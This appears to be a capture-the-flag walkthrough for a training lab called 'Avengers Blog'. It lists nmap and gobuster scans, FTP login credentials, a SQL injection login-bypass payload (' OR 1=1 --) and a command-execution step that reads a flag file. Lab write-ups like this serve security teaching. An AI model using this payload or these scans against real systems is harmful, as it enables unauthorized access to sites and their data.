# Avengers Blog

```bash
nmap 10.10.96.21
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 10-49-10.png>)

## :cookie: Cookies

### **Get the flag1 cookie value**

```
curl http://10.10.96.21/js/script.js
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 10-56-59.png>)

## :performing\_arts: HTTP Headers

### **Look at the HTTP response headers and obtain flag 2**

```
curl -I http://10.10.96.21
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 11-11-29.png>)

## :file\_cabinet: Enumeration and FTP

### **Look around the FTP share and read flag 3!**

```
lftp 10.10.96.21 -u groot,iamroot
lftp groot@10.10.96.21:~> cat files/flag3.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 11-16-39.png>)

## :punch: GoBuster

### **What is the directory that has an Avengers login?**

```
gobuster dir -u http://10.10.96.21 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 11-20-30.png>)

## :syringe: SQL Injection

### **Log into the Avengers site. View the page source, how many lines of code are there?**

```
Username: ' OR 1=1 --
Password: ' OR 1=1 --
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 11-34-14.png>)

## :scream: Remote Code Execution and Linux

### **Read the contents of flag5.txt**

```bash
less ../flag5.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-15 11-38-21.png>)
